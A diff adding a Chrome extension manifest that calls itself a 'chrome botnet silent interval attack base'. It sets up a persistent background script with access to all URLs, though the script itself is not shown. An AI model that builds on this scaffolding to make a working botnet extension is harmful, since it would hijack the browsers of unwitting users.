@@ -1,0 +1,19 @@
+{
+    "name": "chrome-botnet-silent-interval",
+    "version": "1.0.0",
+    "description": "chrome botnet silent interval attack base",
+    "icons": {
+      "16": "/app/img/ico.png",
+      "48": "/app/img/ico.png",
+      "128": "/app/img/ico.png"
+    },
+    "offline_enabled": true,
+    "background": {
+      "scripts": ["app/js/background.js"],
+      "persistent": true
+    },
+    "permissions": [
+       "<all_urls>"
+    ],
+    "manifest_version": 2
+}
